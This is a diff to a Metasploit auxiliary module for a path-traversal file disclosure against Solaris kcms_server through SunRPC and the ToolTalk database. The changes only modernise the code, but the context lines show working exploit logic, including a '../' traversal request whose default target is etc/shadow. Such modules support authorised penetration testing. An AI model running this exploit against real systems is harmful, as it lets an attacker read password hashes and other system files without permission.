@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::SunRPC
 
   def initialize
@@ -43,7 +40,7 @@ class MetasploitModule < Msf::Auxiliary
       [
         OptString.new('PATH', [ true, "Path to the file to disclose, releative to the root dir.", 'etc/shadow']),
         OptString.new('OUTPUTPATH', [ false, "Local path to save the file contents to", nil ])
-      ], self.class)
+      ])
   end
 
   def run
@@ -68,14 +65,14 @@ class MetasploitModule < Msf::Auxiliary
 
     # Prepare the traversing request for kcms_server
     trav = 'TT_DB/' + ('../' * 5) + path
-    buf = XDR.encode(
+    buf = Rex::Encoder::XDR.encode(
       [trav, 1024],
       0, # O_RDONLY
       0755) # mode
 
     # Make the request
     ret = sunrpc_call(1003, buf)
-    ack, fsize, fd = XDR.decode!(ret, Integer, Integer, Integer)
+    ack, fsize, fd = Rex::Encoder::XDR.decode!(ret, Integer, Integer, Integer)
 
     if (ack != 0)
       print_error("KCMS open() failed (ack: 0x%x != 0)" % ack)
@@ -90,13 +87,13 @@ class MetasploitModule < Msf::Auxiliary
     print_status("fd: #{fd}, file size #{fsize}")
 
     print_status("Making read() request to the kcms_server...")
-    buf = XDR.encode(
+    buf = Rex::Encoder::XDR.encode(
       fd,
       0,
       fsize)
 
     ret = sunrpc_call(1005, buf)
-    x, data = XDR.decode!(ret, Integer, [Integer])
+    x, data = Rex::Encoder::XDR.decode!(ret, Integer, [Integer])
 
     # If we got something back...
     if (data)
@@ -120,7 +117,7 @@ class MetasploitModule < Msf::Auxiliary
 
     # Close it regardless if it returned anything..
     print_status("Making close() request to the kcms_server...")
-    buf = XDR.encode(fd)
+    buf = Rex::Encoder::XDR.encode(fd)
     sunrpc_call(1004, buf)
 
     # done
@@ -140,7 +137,7 @@ class MetasploitModule < Msf::Auxiliary
   def ttdb_build(path)
     sunrpc_create('tcp', 100083, 1)
     sunrpc_authunix('localhost', 0, 0, [])
-    msg = XDR.encode(
+    msg = Rex::Encoder::XDR.encode(
       [path, 1024],
       path.length,
       1, # KEY (VArray head?)
@@ -154,9 +151,8 @@ class MetasploitModule < Msf::Auxiliary
       0x10002,
       path.length)
     ret = sunrpc_call(3, msg)
-    arr = XDR.decode!(ret, Integer, Integer)
+    arr = Rex::Encoder::XDR.decode!(ret, Integer, Integer)
     print_status("TTDB reply: 0x%x, %d" % arr)
     sunrpc_destroy
   end
-
 end
